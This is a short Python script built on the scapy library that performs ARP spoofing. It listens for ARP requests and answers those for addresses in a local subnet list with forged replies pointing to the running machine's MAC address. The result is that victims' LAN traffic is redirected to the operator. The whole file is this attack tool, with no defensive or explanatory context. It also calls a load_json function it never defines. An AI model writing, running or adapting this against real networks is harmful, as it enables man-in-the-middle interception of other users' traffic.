#! /usr/bin/python

from scapy.all import *
import json

def arp_response(pkt):
	if subnet_l.has_key(pkt.pdst):
		arp = (
			Ether(src=localMAC, dst=pkt.hwsrc)/
			ARP(
		    	op="is-at",
		    	#posion to wlan interface
		    	hwsrc=localMAC,
		    	psrc=pkt.pdst,
		    	#send back to the source host
		    	hwdst=pkt.hwsrc,
		    	pdst=pkt.psrc
		    )
		)
		sendp(arp, iface=conf.iface)
		print(arp.pdst + " spoofed when calling " + arp.psrc)
	pass

def init():
	global subnet_l, localMAC
	subnet_l = load_json("./SubnetList.json")
	localMAC = get_if_hwaddr(conf.iface)
	pass

if __name__ == '__main__':
	init()
	print("Running over %s ..."%(str(conf.iface)))
	sniff(filter="arp and arp[7] = 1", prn=arp_response)
